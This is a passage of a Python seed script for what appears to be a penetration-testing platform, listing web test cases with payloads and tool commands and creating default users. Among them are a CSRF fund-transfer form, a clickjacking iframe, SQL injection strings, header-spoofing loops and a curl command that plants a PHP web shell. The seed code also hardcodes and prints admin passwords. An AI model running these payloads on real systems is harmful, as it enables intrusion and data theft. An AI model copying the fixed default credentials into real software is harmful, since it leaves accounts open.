        "tags": ["business-logic", "payment", "gateway", "critical", "replay"],
        "references": [],
        "applicability_conditions": {"requires_any": ["features:payment", "features:shopping_cart"]}
    },
    {
        "module_id": "MOD-45", "phase": "business", "severity": "high",
        "title": "OTP / OTAC Testing",
        "description": "Comprehensive OTP security testing for bypass, brute force, reuse, and timing attacks.",
        "owasp_ref": "A07:2021", "cwe_id": "CWE-308",
        "where_to_test": "OTP input screens, transaction confirmation OTPs, password reset OTPs",
        "what_to_test": "OTP bypass via direct navigation, brute force (6-digit), OTP reuse, OTP expiry, response manipulation, previous OTP acceptance",
        "how_to_test": "1. Direct URL bypass: skip OTP step → access resource directly\n2. Brute force: 000000-999999 via Burp Intruder\n3. Send OTP → Use it → Use same OTP again → Should fail\n4. Request OTP → Wait 10 minutes → Use → Should fail\n5. Use previous valid OTP from logs/history",
        "payloads": ["000000", "123456", "111111", "999999"],
        "tool_commands": [
            {"tool": "Burp Intruder", "command": "Capture OTP submission → Intruder → Payload: Numbers 000000-999999 → Attack → Check response length difference", "description": "OTP 6-digit brute force"}
        ],
        "pass_indicators": "Rate limiting on OTP. Single-use OTPs. Short expiry (5 min). Direct URL access enforces OTP.",
        "fail_indicators": "OTP brute forceable. OTP reusable. No expiry. Direct bypass works.",
        "remediation": "Rate limit OTP to 3-5 attempts. Single-use tokens. 5-minute expiry. Enforce OTP server-side.",
        "tags": ["business-logic", "otp", "bypass", "brute-force"],
        "references": [],
        "applicability_conditions": {"requires_any": ["features:otp", "auth_type:otp", "auth_type:mfa"]}
    },
    # ======================= API =======================
    {
        "module_id": "MOD-49-BOLA", "phase": "api", "severity": "critical",
        "title": "BOLA - Broken Object Level Authorization",
        "description": "Test REST API for Broken Object Level Authorization (IDOR at API level) — accessing other users' data via their IDs.",
        "owasp_ref": "A01:2021", "cwe_id": "CWE-639",
        "where_to_test": "All REST API endpoints with resource IDs in URL or request body",
        "what_to_test": "User A accessing User B's resources via ID substitution in API calls",
        "how_to_test": "1. Map all API endpoints that return user-specific data\n2. Login as User A → GET /api/v1/users/{USER_B_ID}/profile\n3. GET /api/v1/orders/{USER_B_ORDER_ID}\n4. Test with sequential IDs and UUIDs from error messages\n5. Use Autorize extension to automate",
        "payloads": [],
        "tool_commands": [
            {"tool": "Postman", "command": "GET /api/v1/users/{other_user_id} with User A's token → Check if User B's data returned", "description": "Manual BOLA test"},
            {"tool": "Autorize", "command": "Configure two user tokens in Autorize → Browse as User A → Extension checks each request with User B's token", "description": "Automated BOLA detection"}
        ],
        "pass_indicators": "403 returned when accessing other user's resources. Object-level ownership enforced.",
        "fail_indicators": "Other user's data returned. No ownership check on API level.",
        "remediation": "Implement object-level authorization on every API endpoint. Verify resource belongs to authenticated user.",
        "tags": ["api", "bola", "idor", "critical", "owasp-api"],
        "references": [],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-49-BFLA", "phase": "api", "severity": "high",
        "title": "BFLA - Broken Function Level Authorization",
        "description": "Test API for Broken Function Level Authorization — regular users calling admin-only API functions.",
        "owasp_ref": "A01:2021", "cwe_id": "CWE-269",
        "where_to_test": "Admin API endpoints, privileged API operations",
        "what_to_test": "Regular user calling DELETE /api/users/{id}, GET /api/admin/config, POST /api/roles/assign",
        "how_to_test": "1. Map all admin API endpoints from JS files, docs, Swagger\n2. Login as regular user → Call admin endpoints\n3. Try HTTP method override: POST with X-HTTP-Method-Override: DELETE\n4. Try calling admin operations from user session",
        "payloads": [],
        "tool_commands": [
            {"tool": "Burp Suite", "command": "Login as user → GET /api/admin/users → Check if admin data returned", "description": "Admin endpoint access as regular user"},
            {"tool": "arjun", "command": "arjun -u https://TARGET/api/admin/config -H 'Authorization: Bearer USER_TOKEN'", "description": "Parameter mining on admin endpoints"}
        ],
        "pass_indicators": "403 for all admin functions when called by regular user. Function-level authorization enforced.",
        "fail_indicators": "Admin functions accessible to regular users. No role check on API functions.",
        "remediation": "Implement function-level authorization. Check role/permission for every API function, not just UI routes.",
        "tags": ["api", "bfla", "authorization", "admin-access"],
        "references": [],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-49-RATE", "phase": "api", "severity": "medium",
        "title": "API Rate Limiting",
        "description": "Test API for lack of rate limiting enabling brute force, scraping, and DoS attacks.",
        "owasp_ref": "A04:2021", "cwe_id": "CWE-770",
        "where_to_test": "All API endpoints, especially auth, search, and resource-intensive operations",
        "what_to_test": "Rate limit headers (X-RateLimit-*), enforcement after limit exceeded, bypass via IP rotation, bypass via header manipulation",
        "how_to_test": "1. Send 100 requests in 60 seconds to any endpoint\n2. Check for 429 Too Many Requests response\n3. Check X-RateLimit-Remaining header\n4. Try bypass: Add X-Forwarded-For: 1.2.3.4, X-Real-IP: 1.2.3.4\n5. Try changing User-Agent between requests",
        "payloads": [],
        "tool_commands": [
            {"tool": "Burp Intruder", "command": "Send request to Intruder → Null payload → 100 requests → Check for 429 responses", "description": "Rate limit testing"},
            {"tool": "curl", "command": "for i in {1..200}; do curl -s -o /dev/null -w '%{http_code}\\n' -H 'X-Forwarded-For: '$(shuf -i 1-255 -n 4 | tr '\\n' '.'|sed 's/\\.$//')'' https://TARGET/api/endpoint; done", "description": "Rate limit bypass via IP spoofing"}
        ],
        "pass_indicators": "429 returned after limit. X-RateLimit headers present. X-Forwarded-For not blindly trusted.",
        "fail_indicators": "No rate limiting. 200 for unlimited requests. Rate limit bypassable via header manipulation.",
        "remediation": "Implement rate limiting at API gateway level. Use Redis for distributed rate limiting. Don't trust X-Forwarded-For for rate limit bypass prevention.",
        "tags": ["api", "rate-limiting", "dos", "brute-force"],
        "references": [],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-48-GRAPHQL", "phase": "api", "severity": "high",
        "title": "GraphQL Security Testing",
        "description": "Test GraphQL endpoints for introspection, injection, batch query abuse, and field suggestion exploitation.",
        "owasp_ref": "A05:2021", "cwe_id": "CWE-200",
        "where_to_test": "/graphql, /graphiql, /api/graphql, /v1/graphql endpoints",
        "what_to_test": "Introspection enabled in production, field suggestion, batch query brute force, SQL/NoSQL injection via arguments, IDOR via GraphQL",
        "how_to_test": "1. Test introspection: {__schema{types{name,fields{name}}}}\n2. Batch login queries for brute force bypass\n3. Inject SQL/NoSQL in arguments: {user(id: '1 OR 1=1')}\n4. Test field suggestions for schema discovery\n5. Run graphql-cop automated security check",
        "payloads": [
            "{__schema{types{name,fields{name}}}}",
            "{__schema{queryType{name}}}",
            "{user(id: \"1 OR 1=1\"){email password}}",
            "[{\"query\":\"mutation{login(user:\\\"admin\\\",pass:\\\"a\\\"){token}}\"},{\"query\":\"mutation{login(user:\\\"admin\\\",pass:\\\"b\\\"){token}}\"}]"
        ],
        "tool_commands": [
            {"tool": "graphql-cop", "command": "python graphql-cop.py -t https://TARGET/graphql", "description": "Automated GraphQL security audit"},
            {"tool": "InQL (Burp)", "command": "Install InQL Burp extension → Scanner → Generate all queries from introspection", "description": "InQL automated GraphQL testing"},
            {"tool": "clairvoyance", "command": "clairvoyance https://TARGET/graphql -o schema.json", "description": "GraphQL schema discovery without introspection"}
        ],
        "pass_indicators": "Introspection disabled in production. Batch queries limited. Field suggestions disabled. Injection-safe resolvers.",
        "fail_indicators": "Full schema via introspection. Batch query brute force works. Injection in arguments successful.",
        "remediation": "Disable introspection in production. Implement query complexity limits. Rate limit operations. Validate resolver inputs.",
        "tags": ["api", "graphql", "introspection", "injection"],
        "references": [{"title": "PayloadsAllTheThings - GraphQL", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL Injection"}],
        "applicability_conditions": {"requires_any": ["api_type:graphql", "features:graphql"]}
    },
    {
        "module_id": "MOD-49-VERSIONING", "phase": "api", "severity": "medium",
        "title": "API Version Security Testing",
        "description": "Test older API versions for security regressions, deprecated but functional endpoints.",
        "owasp_ref": "A09:2021", "cwe_id": "CWE-1104",
        "where_to_test": "API versioned endpoints: /api/v1/, /api/v2/, /api/v0/",
        "what_to_test": "Older API versions with weaker security controls, deprecated endpoints still functional, auth bypasses in old versions",
        "how_to_test": "1. Identify current API version (e.g., /api/v2/)\n2. Test older versions: /api/v1/, /api/v0/, /api/beta/\n3. Check if older versions have same auth requirements\n4. Test if old versions lack new security controls",
        "payloads": ["/api/v1/", "/api/v0/", "/api/beta/", "/v1/", "/v2/", "/api/2022-01/"],
        "tool_commands": [
            {"tool": "ffuf", "command": "ffuf -w /opt/navigator/data/SecLists/Discovery/Web-Content/api/api-endpoints.txt -u https://TARGET/api/FUZZ -mc 200,201,301 -H 'Authorization: Bearer TOKEN'", "description": "API endpoint discovery"},
            {"tool": "ffuf", "command": "ffuf -w versions.txt -u https://TARGET/FUZZ/users -mc 200 -H 'Authorization: Bearer TOKEN'", "description": "API version enumeration"}
        ],
        "pass_indicators": "All API versions maintain same security controls. Deprecated versions removed or redirect to current.",
        "fail_indicators": "Older API versions accessible with weaker auth. Security controls absent in older versions.",
        "remediation": "Decommission deprecated API versions. Apply same security controls across all versions. Use API gateway for centralized auth.",
        "tags": ["api", "versioning", "security-regression"],
        "references": [],
        "applicability_conditions": {}
    },
    # ======================= CLIENT SIDE =======================
    {
        "module_id": "MOD-34-CSRF", "phase": "client", "severity": "high",
        "title": "Cross-Site Request Forgery (CSRF)",
        "description": "Test all state-changing operations for CSRF vulnerabilities.",
        "owasp_ref": "A01:2021", "cwe_id": "CWE-352",
        "where_to_test": "All state-changing POST/PUT/DELETE requests (profile update, password change, fund transfer, delete actions)",
        "what_to_test": "CSRF token presence and validation, SameSite cookie attribute, referer header validation, custom header validation",
        "how_to_test": "1. Burp → Right-click state-changing request → Engagement Tools → Generate CSRF PoC\n2. Host PoC on different domain\n3. While logged in, open PoC → If action executes: VULNERABLE\n4. Try: Remove token, empty token, another user's valid token, change POST to GET",
        "payloads": [
            "<html><body><form action='https://TARGET/transfer' method='POST'><input name='amount' value='1000'><input name='to' value='attacker'></form><script>document.forms[0].submit()</script></body></html>"
        ],
        "tool_commands": [
            {"tool": "Burp Suite", "command": "Right-click POST request → Engagement Tools → Generate CSRF PoC → Open in browser while logged in", "description": "Generate and test CSRF PoC"}
        ],
        "pass_indicators": "CSRF token present and unique per session. SameSite=Strict on cookies. Custom header required (X-Requested-With).",
        "fail_indicators": "CSRF PoC successfully executes action. Token absent or not validated. Reusable/predictable tokens.",
        "remediation": "Implement CSRF tokens on all state-changing forms. Set SameSite=Strict. Verify Origin/Referer headers.",
        "tags": ["client", "csrf", "state-change"],
        "references": [{"title": "PayloadsAllTheThings - CSRF", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Cross-Site Request Forgery"}],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-CLICKJACK", "phase": "client", "severity": "medium",
        "title": "Clickjacking",
        "description": "Test if application pages can be embedded in iframes on external domains.",
        "owasp_ref": "A05:2021", "cwe_id": "CWE-1021",
        "where_to_test": "All sensitive pages: login, profile, fund transfer, settings",
        "what_to_test": "X-Frame-Options header, CSP frame-ancestors directive",
        "how_to_test": "1. Create test HTML: <iframe src='https://TARGET/sensitive-page'>\n2. Open in browser → If page loads in iframe: VULNERABLE\n3. Check: curl -I https://TARGET | grep -i x-frame-options\n4. Check: curl -I https://TARGET | grep -i content-security-policy for frame-ancestors",
        "payloads": ["<iframe src='https://TARGET/profile' style='opacity:0;position:absolute;top:0;left:0;width:100%;height:100%'></iframe>"],
        "tool_commands": [
            {"tool": "curl", "command": "curl -I https://TARGET 2>&1 | grep -iE 'x-frame-options|content-security-policy'", "description": "Check clickjacking protection headers"}
        ],
        "pass_indicators": "X-Frame-Options: DENY or SAMEORIGIN set. CSP frame-ancestors 'none' or 'self'.",
        "fail_indicators": "Page loads in iframe. Missing X-Frame-Options. No CSP frame-ancestors.",
        "remediation": "Add X-Frame-Options: DENY header. Set CSP: frame-ancestors 'none'.",
        "tags": ["client", "clickjacking", "ui-redressing", "headers"],
        "references": [],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-CSP", "phase": "client", "severity": "medium",
        "title": "Content Security Policy Analysis",
        "description": "Analyze CSP header for weaknesses including unsafe-inline, unsafe-eval, and wildcard sources.",
        "owasp_ref": "A05:2021", "cwe_id": "CWE-1021",
        "where_to_test": "HTTP response headers on all pages",
        "what_to_test": "Missing CSP, unsafe-inline in script-src, unsafe-eval, wildcard (*) sources, missing object-src, JSONP bypass sources",
        "how_to_test": "1. curl -I https://TARGET → Extract Content-Security-Policy header\n2. Paste in https://csp-evaluator.withgoogle.com/ → Check for bypasses\n3. Check for: script-src 'unsafe-inline' (XSS bypass), script-src 'unsafe-eval' (eval attacks)\n4. Check for wildcard: script-src *.googleapis.com → Find JSONP endpoint on googleapis.com",
        "payloads": [],
        "tool_commands": [
            {"tool": "curl", "command": "curl -I https://TARGET | grep -i content-security-policy", "description": "Extract CSP header"},
            {"tool": "CSP Evaluator", "command": "Open https://csp-evaluator.withgoogle.com/ → Paste CSP → Analyze for bypasses", "description": "Automated CSP analysis"}
        ],
        "pass_indicators": "Strict CSP with specific source allowlists. No unsafe-inline or unsafe-eval. object-src 'none'. base-uri 'self'.",
        "fail_indicators": "Missing CSP. unsafe-inline present. Wildcard sources. No object-src. JSONP bypass possible.",
        "remediation": "Implement strict CSP. Use nonces or hashes instead of unsafe-inline. Set object-src 'none', base-uri 'self'.",
        "tags": ["client", "csp", "xss-mitigation", "headers"],
        "references": [],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-CORS", "phase": "client", "severity": "high",
        "title": "CORS Misconfiguration",
        "description": "Test CORS policy for reflected origins, null origin acceptance, and credentials with wildcard.",
        "owasp_ref": "A05:2021", "cwe_id": "CWE-942",
        "where_to_test": "All API endpoints, especially those with authentication",
        "what_to_test": "Reflected Origin (Access-Control-Allow-Origin mirrors attacker domain), null origin, wildcard with credentials",
        "how_to_test": "1. curl -H 'Origin: https://evil.com' -I https://TARGET/api/user → Check Access-Control-Allow-Origin\n2. curl -H 'Origin: null' -I https://TARGET/api/ → Check response\n3. curl -H 'Origin: https://TARGET.evil.com' -I https://TARGET/api/ → Regex bypass test\n4. Check if Access-Control-Allow-Credentials: true with wildcard",
        "payloads": [],
        "tool_commands": [
            {"tool": "curl", "command": "curl -H 'Origin: https://evil.com' -I https://TARGET/api/user", "description": "Test CORS reflected origin"},
            {"tool": "curl", "command": "curl -H 'Origin: null' -I https://TARGET/api/", "description": "Test null origin CORS bypass"},
            {"tool": "cors-scanner", "command": "python cors_scanner.py -u https://TARGET/api/ --headers", "description": "Automated CORS misconfiguration scan"}
        ],
        "pass_indicators": "Origin strictly validated. No wildcard with credentials. Null origin rejected.",
        "fail_indicators": "Attacker origin reflected in ACAO. Null origin allowed with credentials. Regex bypass possible (TARGET.evil.com accepted).",
        "remediation": "Maintain strict CORS allowlist. Never use wildcard with credentials. Validate origin server-side.",
        "tags": ["client", "cors", "misconfiguration", "cross-origin"],
        "references": [{"title": "PayloadsAllTheThings - CORS", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS Misconfiguration"}],
        "applicability_conditions": {}
    },
    # ======================= TRANSPORT =======================
    {
        "module_id": "MOD-28-HEADERS", "phase": "transport", "severity": "medium",
        "title": "HTTP Security Headers Audit",
        "description": "Comprehensive audit of all OWASP-recommended HTTP security headers.",
        "owasp_ref": "A05:2021", "cwe_id": "CWE-693",
        "where_to_test": "HTTP response headers on all pages",
        "what_to_test": "HSTS, X-Content-Type-Options, X-Frame-Options, X-XSS-Protection, CSP, Referrer-Policy, Permissions-Policy, Cache-Control on auth pages",
        "how_to_test": "1. curl -I https://TARGET → Check all security headers\n2. Use securityheaders.com scan\n3. Check Cache-Control on authenticated pages (should be no-store)\n4. Verify HSTS includeSubDomains",
        "payloads": [],
        "tool_commands": [
            {"tool": "curl", "command": "curl -I https://TARGET 2>&1 | grep -iE 'strict-transport|x-content-type|x-frame|content-security|referrer-policy|permissions-policy|cache-control'", "description": "Check all security headers"},
            {"tool": "securityheaders.com", "command": "Open https://securityheaders.com/?q=TARGET&followRedirects=on → Review grade and missing headers", "description": "Online security headers scanner"}
        ],
        "pass_indicators": "All OWASP recommended headers present. HSTS with includeSubDomains and preload. Cache-Control: no-store on auth pages.",
        "fail_indicators": "Missing HSTS, X-Content-Type-Options, or CSP headers. No Cache-Control on auth pages. Missing Permissions-Policy.",
        "remediation": "Add all security headers via server/middleware configuration. Refer to OWASP Secure Headers Project for implementation.",
        "tags": ["transport", "security-headers", "hsts", "csp"],
        "references": [{"title": "OWASP Secure Headers Project", "url": "https://owasp.org/www-project-secure-headers/"}],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-29", "phase": "transport", "severity": "medium",
        "title": "IP Spoofing & X-Forwarded-For Abuse",
        "description": "Test if the application blindly trusts X-Forwarded-For or X-Real-IP headers for rate limiting or access control.",
        "owasp_ref": "A05:2021", "cwe_id": "CWE-345",
        "where_to_test": "Login, rate-limited endpoints, IP-based access controls",
        "what_to_test": "Bypass rate limiting via X-Forwarded-For header manipulation, bypass IP-based allowlists",
        "how_to_test": "1. Get rate limited → Add X-Forwarded-For: 1.2.3.4 → Check if limit resets\n2. Try accessing admin panel with X-Forwarded-For: 127.0.0.1\n3. Try True-Client-IP: 127.0.0.1, X-Real-IP: 127.0.0.1 headers",
        "payloads": [],
        "tool_commands": [
            {"tool": "curl", "command": "curl -H 'X-Forwarded-For: 127.0.0.1' https://TARGET/admin → Check if IP allowlist bypassed", "description": "IP spoofing bypass test"},
            {"tool": "curl", "command": "curl -H 'X-Forwarded-For: 8.8.8.8' https://TARGET/login → After rate limit → Test if limit bypassed", "description": "Rate limit bypass via X-Forwarded-For"}
        ],
        "pass_indicators": "X-Forwarded-For not trusted for security decisions. Rate limiting uses actual IP. IP allowlists use verified IPs.",
        "fail_indicators": "X-Forwarded-For bypasses rate limiting. IP allowlist bypassed via header manipulation.",
        "remediation": "Never trust X-Forwarded-For for security decisions unless behind trusted proxy. Use actual connection IP.",
        "tags": ["transport", "ip-spoofing", "x-forwarded-for", "rate-limiting"],
        "references": [],
        "applicability_conditions": {}
    },
    # ======================= INFRA =======================
    {
        "module_id": "MOD-24-METHODS", "phase": "infra", "severity": "medium",
        "title": "HTTP Method Testing (TRACE, PUT, DELETE)",
        "description": "Test for dangerous HTTP methods enabled on the web server.",
        "owasp_ref": "A05:2021", "cwe_id": "CWE-749",
        "where_to_test": "Web server root and all directories",
        "what_to_test": "TRACE method (Cross-Site Tracing), PUT method (file write), DELETE method (resource deletion), OPTIONS method disclosure",
        "how_to_test": "1. curl -X OPTIONS https://TARGET -i → Check Allow header\n2. curl -X TRACE https://TARGET -i → Check for echo of request headers\n3. curl -X DELETE https://TARGET/api/users/1 → Check if deletion allowed\n4. curl -X PUT https://TARGET/test.php -d '<?php system($_GET[c])?>' → Check file creation",
        "payloads": [],
        "tool_commands": [
            {"tool": "curl", "command": "curl -X OPTIONS https://TARGET -i | grep Allow", "description": "Check allowed HTTP methods"},
            {"tool": "curl", "command": "curl -X TRACE https://TARGET -i", "description": "Test TRACE method (Cross-Site Tracing)"},
            {"tool": "nikto", "command": "nikto -h https://TARGET -output nikto_results.txt", "description": "Full Nikto web server scan"}
        ],
        "pass_indicators": "Only GET, POST, HEAD allowed. TRACE disabled. PUT/DELETE require authentication.",
        "fail_indicators": "TRACE enabled (XST attack possible). PUT allowed (file upload). Unauthenticated DELETE.",
        "remediation": "Disable TRACE, PUT, DELETE methods unless required. Restrict all methods to minimum necessary.",
        "tags": ["infra", "http-methods", "trace", "options"],
        "references": [],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-25-SOURCE", "phase": "infra", "severity": "high",
        "title": "Source Code & Config File Disclosure",
        "description": "Test for exposed source code, configuration files, backup files, and sensitive documentation.",
        "owasp_ref": "A05:2021", "cwe_id": "CWE-538",
        "where_to_test": "Common sensitive file paths on the server",
        "what_to_test": ".env, web.config, application.properties, config.php, database.yml, Dockerfile, docker-compose.yml",
        "how_to_test": "1. Try accessing: /.env, /config.php, /web.config, /application.properties\n2. Try backup: /index.php.bak, /application.bak\n3. Try: /Dockerfile, /docker-compose.yml, /.dockerenv\n4. Try: /package.json, /composer.json (dependency disclosure)",
        "payloads": ["/.env", "/config.php", "/.htaccess", "/web.config", "/application.properties", "/config.yml", "/Dockerfile", "/database.yml", "/.npmrc", "/composer.json"],
        "tool_commands": [
            {"tool": "ffuf", "command": "ffuf -w /opt/navigator/data/SecLists/Discovery/Web-Content/raft-large-files.txt -u https://TARGET/FUZZ -mc 200", "description": "Sensitive file fuzzing"},
            {"tool": "curl", "command": "for f in /.env /.git/HEAD /web.config /config.php; do echo \"$f: $(curl -so /dev/null -w '%{http_code}' https://TARGET$f)\"; done", "description": "Quick check for common sensitive files"}
        ],
        "pass_indicators": "All sensitive files return 403/404. Config files not accessible from web root.",
        "fail_indicators": "Database credentials, API keys, or source code accessible.",
        "remediation": "Move all config files outside web root. Block access to sensitive files via Nginx/Apache config.",
        "tags": ["infra", "source-code", "config-disclosure", "credentials"],
        "references": [],
        "applicability_conditions": {}
    },
    # ======================= TOOLS =======================
    {
        "module_id": "MOD-TOOL-NIKTO", "phase": "tools", "severity": "info",
        "title": "Nikto Web Server Scanner",
        "description": "Run Nikto scanner to identify web server misconfigurations, dangerous files, and outdated server software.",
        "owasp_ref": "A05:2021", "cwe_id": "CWE-1032",
        "where_to_test": "Full application URL",
        "what_to_test": "Server misconfigurations, dangerous files, outdated software, default files",
        "how_to_test": "Run Nikto against the target and review all findings. Manually verify each potential vulnerability.",
        "payloads": [],
        "tool_commands": [
            {"tool": "nikto", "command": "nikto -h https://TARGET -output nikto_results.html -Format htm -Tuning x 6", "description": "Nikto full web server scan with HTML output"},
            {"tool": "nikto", "command": "nikto -h https://TARGET -ssl -port 443 -output nikto_ssl.txt", "description": "Nikto SSL-specific scan"}
        ],
        "pass_indicators": "Nikto reports no critical findings. Server version hidden. Default files removed.",
        "fail_indicators": "Server version disclosed. Dangerous files found. Default credentials accepted.",
        "remediation": "Patch all identified issues from Nikto report. Remove default files. Update server software.",
        "tags": ["tools", "nikto", "automated", "server-scan"],
        "references": [],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-TOOL-NUCLEI2", "phase": "tools", "severity": "info",
        "title": "Nuclei Full Template Scan",
        "description": "Run comprehensive Nuclei scan with all relevant templates for CVE detection and misconfiguration.",
        "owasp_ref": "A06:2021", "cwe_id": "CWE-1032",
        "where_to_test": "Full application",
        "what_to_test": "CVEs, exposed admin panels, default credentials, security misconfigurations, exposed API keys",
        "how_to_test": "1. Update nuclei templates\n2. Run targeted scans by category\n3. Review and manually verify all findings\n4. Focus on critical and high severity results",
        "payloads": [],
        "tool_commands": [
            {"tool": "nuclei", "command": "nuclei -update-templates && nuclei -u https://TARGET -t ~/nuclei-templates/ -severity critical,high -o nuclei_critical.txt", "description": "Nuclei critical and high severity scan"},
            {"tool": "nuclei", "command": "nuclei -u https://TARGET -tags default-login,panels,exposures -o nuclei_panels.txt", "description": "Nuclei scan for admin panels and exposures"},
            {"tool": "nuclei", "command": "nuclei -u https://TARGET -t cves/ -o nuclei_cves.txt", "description": "Nuclei CVE-specific scan"}
        ],
        "pass_indicators": "No critical or high severity findings. No default credentials. No exposed admin panels.",
        "fail_indicators": "Critical CVEs detected. Default credentials found. Admin panels exposed.",
        "remediation": "Apply patches for all CVEs found. Remove default credentials. Restrict admin panel access.",
        "tags": ["tools", "nuclei", "cve", "automated"],
        "references": [],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-TOOL-SQLMAP", "phase": "tools", "severity": "info",
        "title": "SQLMap Comprehensive SQL Injection Scan",
        "description": "Run SQLMap comprehensively on all interesting parameters, forms, and API endpoints.",
        "owasp_ref": "A03:2021", "cwe_id": "CWE-89",
        "where_to_test": "All URL parameters, POST forms, HTTP headers, cookies",
        "what_to_test": "Error-based, boolean-based, time-based, union-based SQL injection across all endpoints",
        "how_to_step": "1. Start with manual identified parameters\n2. Run SQLMap on all API endpoints from Burp sitemap export\n3. Use crawl mode for automated discovery\n4. Focus on authenticated endpoints (pass cookie/token)",
        "payloads": [],
        "tool_commands": [
            {"tool": "sqlmap", "command": "sqlmap -u 'https://TARGET?id=1' --level=5 --risk=3 --dbs --batch --random-agent", "description": "SQLMap on URL parameter"},
            {"tool": "sqlmap", "command": "sqlmap -u 'https://TARGET/api/users' --data='{\"id\":1}' --content-type='application/json' --level=5 --dbs --batch -H 'Authorization: Bearer TOKEN'", "description": "SQLMap on JSON API with auth"},
            {"tool": "sqlmap", "command": "sqlmap -u 'https://TARGET' --crawl=3 --level=3 --risk=2 --dbs --batch -H 'Authorization: Bearer TOKEN'", "description": "SQLMap crawl and scan entire application"}
        ],
        "pass_indicators": "SQLMap finds no vulnerabilities. All queries return same results with payloads.",
        "fail_indicators": "SQLMap confirms SQL injection. Database names/tables/data dumped.",
        "remediation": "Fix all SQLMap-confirmed injection points with parameterized queries.",
        "tags": ["tools", "sqlmap", "sqli", "automated"],
        "references": [],
        "applicability_conditions": {}
    },
]


async def seed():
    print("Creating database tables...")
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    print("Tables created.")

    async with AsyncSessionLocal() as db:
        # Create super_admin (platform owner) — distinct from org admin
        existing_super = await db.execute(select(User).where(User.username == "superadmin"))
        if not existing_super.scalar_one_or_none():
            super_admin = User(
                email="superadmin@vapt.local",
                username="superadmin",
                full_name="Platform Super Admin",
                hashed_password=hash_password("SuperAdmin@2026!"),
                role="super_admin",
                xp_points=0,
                level=1,
            )
            db.add(super_admin)
            await db.flush()
            print("Created super_admin user: superadmin / SuperAdmin@2026!")

        # Create default organization
        existing_org = await db.execute(select(Organization).where(Organization.slug == "default"))
        default_org = existing_org.scalar_one_or_none()
        if not default_org:
            default_org = Organization(name="Default Organization", slug="default")
            db.add(default_org)
            await db.flush()
            print("Created default organization: Default Organization")

        # Create default org admin user
        existing_admin = await db.execute(select(User).where(User.username == "admin"))
        if not existing_admin.scalar_one_or_none():
            admin = User(
                email="admin@vapt.local",
                username="admin",
                full_name="VAPT Administrator",
                hashed_password=hash_password("Admin@2026!"),
                role="admin",
                xp_points=0,
                level=1,
                organization_id=default_org.id,
            )
            db.add(admin)
            await db.flush()
            print("Created org admin user: admin / Admin@2026!")

        # Create default tester user
        existing_tester = await db.execute(select(User).where(User.username == "tester"))
        if not existing_tester.scalar_one_or_none():
            tester = User(
                email="tester@vapt.local",
                username="tester",
                full_name="Default Tester",
                hashed_password=hash_password("Tester@2026!"),
                role="tester",
            )
            db.add(tester)
            await db.flush()
            print(f"Created tester user: tester / Tester@2026!")

        # Create categories
        cat_map = {}
        for slug, name, phase, icon, order in CATEGORIES:
            existing = await db.execute(select(Category).where(Category.slug == slug))
            cat = existing.scalar_one_or_none()
            if not cat:
                cat = Category(name=name, slug=slug, phase=phase, icon=icon, order_index=order)
                db.add(cat)
                await db.flush()
                print(f"Created category: {name}")
            cat_map[phase] = cat

        await db.flush()

        # Re-fetch categories
        cats_result = await db.execute(select(Category))
        cat_map = {c.phase: c for c in cats_result.scalars().all()}

        # Seed test cases
        existing_count_result = await db.execute(select(TestCase))
        existing_count = len(existing_count_result.scalars().all())
        if existing_count == 0:
            for tc_data in TEST_CASES:
                phase = tc_data["phase"]
                cat = cat_map.get(phase)
                if not cat:
                    print(f"WARNING: No category for phase {phase}, skipping {tc_data['title']}")
                    continue
                tc = TestCase(
                    category_id=cat.id,
                    module_id=tc_data.get("module_id"),
                    title=tc_data["title"],
                    description=tc_data.get("description"),
                    owasp_ref=tc_data.get("owasp_ref"),
                    cwe_id=tc_data.get("cwe_id"),
                    severity=tc_data.get("severity", "medium"),
                    phase=phase,
                    applicability_conditions=tc_data.get("applicability_conditions", {}),
                    where_to_test=tc_data.get("where_to_test"),
                    what_to_test=tc_data.get("what_to_test"),
                    how_to_test=tc_data.get("how_to_test"),
                    payloads=tc_data.get("payloads", []),
                    tool_commands=tc_data.get("tool_commands", []),
                    pass_indicators=tc_data.get("pass_indicators"),
                    fail_indicators=tc_data.get("fail_indicators"),
                    remediation=tc_data.get("remediation"),
                    references=tc_data.get("references", []),
                    tags=tc_data.get("tags", []),
                )
                db.add(tc)
            print(f"Seeded {len(TEST_CASES)} test cases")
        else:
            print(f"Test cases already exist ({existing_count}), skipping seed")

        await db.commit()
        print("\nDatabase seeding complete!")
        print("\nDefault credentials:")
        print("  Super Admin (platform): superadmin / SuperAdmin@2026!")
        print("  Org Admin:             admin / Admin@2026!")
        print("  Tester:                tester / Tester@2026!")


if __name__ == "__main__":
    asyncio.run(seed())
